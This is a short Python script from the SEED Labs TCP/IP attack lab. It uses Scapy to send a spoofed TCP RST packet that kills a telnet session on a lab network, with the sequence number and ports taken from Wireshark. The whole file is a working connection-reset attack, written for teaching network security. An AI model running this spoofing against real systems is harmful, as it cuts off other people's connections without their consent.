#!/usr/bin/env python3
"""
Task 2: TCP RST Attack on telnet Connections (Manual)
SEED Labs - TCP/IP Attack Lab

This script sends a spoofed TCP RST packet to break an existing telnet
connection between two hosts.  All values (src IP, dst IP, ports, seq)
must be obtained from Wireshark before running.

Usage:
    1. Capture traffic with Wireshark and note the current TCP parameters
       for the telnet session you want to kill.
    2. Fill in the variables below.
    3. Run:  python3 rst_attack.py
"""

from scapy.all import *

# ------------------------------------------------------------------
# Fill in these values from Wireshark before running the script.
# ------------------------------------------------------------------
SRC_IP   = "10.9.0.6"   # telnet client IP
DST_IP   = "10.9.0.5"   # telnet server IP
SPORT    = 12345         # client-side source port (from Wireshark)
DPORT    = 23            # telnet destination port
SEQ      = 0             # next expected sequence number (from Wireshark)
# ------------------------------------------------------------------

ip  = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SPORT, dport=DPORT, flags="R", seq=SEQ)
pkt = ip / tcp

ls(pkt)
send(pkt, verbose=0)
print("RST packet sent – telnet session should now be terminated.")
